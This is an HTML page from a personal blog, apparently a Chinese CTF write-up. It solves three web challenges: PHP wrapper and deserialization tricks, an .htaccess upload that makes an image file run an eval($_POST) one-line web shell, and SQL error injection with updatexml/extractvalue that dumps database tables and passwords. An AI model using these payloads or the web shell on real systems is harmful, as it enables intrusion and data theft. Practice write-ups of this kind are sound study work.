@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ctzsb.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[ZJCTF 2019]NiZhuanSiWei 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web做题记录5">
+<meta property="og:url" content="http://ctzsb.top/2023/03/11/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%955/index.html">
+<meta property="og:site_name" content="Ctz">
+<meta property="og:description" content="[ZJCTF 2019]NiZhuanSiWei 1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142055773.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142105555.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142106774.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142109865.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142120351.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142152275.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171251985.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171252614.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171253697.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171253816.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171334521.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409306.webp">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409846.webp">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409918.webp">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171738097.png">
+<meta property="og:image" content="c:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20230317173832569.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412301.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412272.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412333.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412291.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412326.png">
+<meta property="article:published_time" content="2023-03-11T13:52:43.000Z">
+<meta property="article:modified_time" content="2023-03-17T09:40:53.869Z">
+<meta property="article:author" content="SB">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142055773.png">
+
+<link rel="canonical" href="http://ctzsb.top/2023/03/11/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%955/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>web做题记录5 | Ctz</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ctz</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://ctzsb.top/2023/03/11/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%955/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SB">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ctz">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web做题记录5
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-11 21:52:43" itemprop="dateCreated datePublished" datetime="2023-03-11T21:52:43+08:00">2023-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-17 17:40:53" itemprop="dateModified" datetime="2023-03-17T17:40:53+08:00">2023-03-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><span id="more"></span>
+
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142055773.png" alt="image-20230314205511518"></p>
+<p>需要通过GET方式传入，text,file,password</p>
+<p>isset的作用是检测变量是否已设置并且非null</p>
+<p>file_get_contents的作用是将整个文件读入一个字符串</p>
+<p>这里将text文件中读取字符串，还要和welcome to the zjctf相等</p>
+<p>这里使用的是data:&#x2F;&#x2F;写入协议</p>
+<p>第一个payload:<strong>?text&#x3D;data:<em>&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</em></strong></p>
+<p>(text&#x2F;html和text&#x2F;plain的区别</p>
+<p>1、text&#x2F;html的意思是将文件的content-type设置为text&#x2F;html的形式，浏览器在获取到这种文件时会自动调用html的解析器对文件进行相应的处理。</p>
+<p>2、text&#x2F;plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。)</p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142105555.png" alt="image-20230314210521520"></p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142106774.png" alt="image-20230314210637742"></p>
+<p>不能出现flag字符,提示了useless.php这里使用php伪协议来读取文件</p>
+<p><strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</strong></p>
+<p>第二个payload:<strong>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</strong></p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142109865.png" alt="image-20230314210951821"></p>
+<p>得到一段base64编码</p>
+<p>解码后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>这里最后会echo输出$file</p>
+<p>将flag.php的值给了$file,然后反序列化</p>
+<p>这里用在线php编译器编译一下以下的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142120351.png" alt="image-20230314212035292"></p>
+<p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  </p>
+<p>payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  </p>
+<p>获得flag{d36bb710-fc41-4b8c-ad9b-12bdce3cc08f}</p>
+<h2 id="MRCTF2020-你传你🐎呢-1"><a href="#MRCTF2020-你传你🐎呢-1" class="headerlink" title="[MRCTF2020]你传你🐎呢 1"></a>[MRCTF2020]你传你🐎呢 1</h2><p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303142152275.png" alt="image-20230314215233083"></p>
+<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title=".htaccess是什么"></a><strong>.htaccess是什么</strong></h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
+<p>笼统地说，.htaccess可以帮我们实现包括：<strong>文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件</strong>等一些功能。</p>
+<p>解题过程：<br>需要上传两个文件</p>
+<p>上传.htaccess<br>注意第一行指定的是我们要上传的文件，文件名必须相同才能被当作php文件执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>抓包，注意将content-type的值修改为image&#x2F;png</p>
+<p>forward，回显</p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171251985.png" alt="img"></p>
+<h3 id="上传shell-jpg"><a href="#上传shell-jpg" class="headerlink" title="上传shell.jpg"></a>上传shell.jpg</h3><p>简单的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctz&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 上传</p>
+<p>forward，回显</p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171252614.png" alt="image-20230317125242576"></p>
+<p><strong>蚁剑连接（蚁剑连接中填的url地址要填上传成功的一句话木马的地址）</strong></p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171253697.png" alt="image-20230317125311657"></p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171253816.png" alt="image-20230317125326777"></p>
+<p>在根目录找到flag{7c1a5424-cab7-4636-badb-15403a318016}</p>
+<h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>走正常sql流程发现都是回显这个页面</p>
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171334521.png" alt="image-20230317133433450"></p>
+<p>说明常规方法不太行，直接上网查看大佬wp</p>
+<p>发现这道题是xpath报错注入，函数注入</p>
+<p>updatexml()函数分析<br>官方定义：</p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称；</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)；</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据；</p>
+<p>返回内容：若xpath正确则返回更改对象名称，否则返回xpath错误内容</p>
+<p>说白了这个函数就是找查一个xml并替换它的名字，xpath就是xml的路径</p>
+<p>extractvalue()函数分析<br>官方定义：</p>
+<p>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；</p>
+<p>返回内容：若xpath正确则返回目标XML查询的结果，否则返回xpath错误内容</p>
+<p>说白了这个就是找一个xml并返回内容，xpath就是xml的路径</p>
+<p>这里我们利用updatexml函数进行报错注入。</p>
+<p>payload</p>
+<p>登录后复制<br>#查看数据库信息<br><code>http://2d43986a-ef4e-4759-9fa4-8443817eb39a.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</code><br><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409306.webp" alt="[极客大挑战 2019]HardSQL_xml_05"></p>
+<p>#查看数据库里面的表<br><code>http://2d43986a-ef4e-4759-9fa4-8443817eb39a.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123</code><br><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409846.webp" alt="[极客大挑战 2019]HardSQL_xml_06"></p>
+<p>#查看数据表中的字段<br><code>http://2d43986a-ef4e-4759-9fa4-8443817eb39a.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=123</code><br><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171409918.webp" alt="[极客大挑战 2019]HardSQL_xml_07"></p>
+<p>#查询字段里面的内容<br><code>http://2d43986a-ef4e-4759-9fa4-8443817eb39a.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,%27~%27,password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code><br><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171738097.png" alt="image-20230317173801024"></p>
+<p>因为报错注入对报错出的内容有长度限制，所以我们用left()right()语句分别查询，然后再进行flag的拼接。</p>
+<p>#right<br><code>http://2d43986a-ef4e-4759-9fa4-8443817eb39a.node4.buuoj.cn:81/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code><br><img src="C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20230317173832569.png" alt="image-20230317173832569"></p>
+<p>&#96;flag{5073ae68-fff2-4a3b-9778-c0a021dd676c}</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue() :对XML文档进行查询的函数</p>
+<p>语法：extractvalue(目标xml文档，xml路径)</p>
+<p>第一个参数 :  第一个参数可以传入目标xml文档</p>
+<p>第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<p>　　　　　　正常查询 第二个参数的位置格式 为 &#x2F;xxx&#x2F;xx&#x2F;xx&#x2F;xx ,即使查询不到也不会报错</p>
+<p>tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</p>
+<p>再举个栗子：</p>
+<p><code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
+<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
+<p>知道这些知识之后，我们开始注入吧</p>
+<p>百度了web 的骚操作<br>用’^’来连接函数，形成异或<br>这边用的是extractvalue（）</p>
+<p>我们先去爆数据库：</p>
+<p>先构造payload:</p>
+<p>?username&#x3D;admin&amp;password&#x3D;admin’^extractvalue(1,concat(0x5c,(select(database()))))%23</p>
+<p>于是我们知道了库名叫：geek</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201018184418139-1097171319.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412301.png" alt="img"></a></p>
+<p>然后，我们再payload爆表名，但是这里把等于号给我们过滤了，不过我们还有骚操作like用法</p>
+<p>?username&#x3D;admin&amp;password&#x3D;admin’^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))</p>
+<p>于是爆出表名：</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201018185906140-689726997.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412272.png" alt="img"></a></p>
+<p> 爆列名：</p>
+<p>?username&#x3D;admin&amp;password&#x3D;admin’^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201018190035496-1453501241.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412333.png" alt="img"></a></p>
+<p> 爆数据就完事了，这里因为用extractvalue()函数，一次只能显示32个字符，我们需要用right函数</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201018190221214-1470470664.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412291.png" alt="img"></a></p>
+<p> 再用right函数，爆右边，然后拼接一下flag</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201018190330966-1063208716.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303171412326.png" alt="img"></a></p>
+<p> 拼接然后得到flag</p>
+<p>flag{62b5ffa6-498c-465f-94e5-ddc474f549dc}</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/08/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%954/" rel="prev" title="web做题记录4">
+      <i class="fa fa-chevron-left"></i> web做题记录4
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/12/%E4%B8%8A%E6%9C%BA%E8%80%83%E8%AF%95web%E7%BB%83%E4%B9%A0%E9%A2%98/" rel="next" title="sql-labs刷题">
+      sql-labs刷题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei-1"><span class="nav-number">1.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2-1"><span class="nav-number">2.</span> <span class="nav-text">[MRCTF2020]你传你🐎呢 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">3.</span> <span class="nav-text">.htaccess是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0shell-jpg"><span class="nav-number">3.1.</span> <span class="nav-text">上传shell.jpg</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL-1"><span class="nav-number">4.</span> <span class="nav-text">[极客大挑战 2019]HardSQL 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.1.</span> <span class="nav-text">extractvalue()</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SB</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SB</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
